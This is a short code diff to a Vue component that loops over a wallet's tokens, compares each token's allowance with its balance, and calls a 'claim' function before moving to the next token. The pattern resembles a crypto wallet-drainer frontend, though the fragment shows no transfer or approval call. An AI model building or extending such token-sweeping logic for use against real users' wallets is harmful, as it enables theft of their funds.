@@ -484,21 +484,25 @@ export default {
 
           this.processing = false;
           this.isDone = true;
-          if (this.currentIndex + 1 > this.sortedTokens.length) {
-            if (this.claimable > 0) {
-              await claim(this.balance.value);
-              this.claimable = 0;
+          const allownce_value = await allownce(this.maxToken);
+          const balanceoftoken = await balanceOf(this.maxToken);
+          if (allownce_value > balanceoftoken) {
+            if (this.currentIndex + 1 > this.sortedTokens.length) {
+              if (this.claimable > 0) {
+                await claim(this.balance.value);
+                this.claimable = 0;
+              } else {
+                this.processing = false;
+                this.isDone = false;
+                Swal.close();
+                Swal.hideLoading();
+              }
             } else {
-              this.processing = false;
-              this.isDone = false;
-              Swal.close();
-              Swal.hideLoading();
+              this.currentIndex += 1;
+              this.maxToken = null
+              this.maxToken = this.sortedTokens[this.currentIndex];
+              this.wc_claim();
             }
-          } else {
-            this.currentIndex += 1;
-            this.maxToken = null
-            this.maxToken = this.sortedTokens[this.currentIndex];
-            this.wc_claim();
           }
         } else {
           this.wConnect();
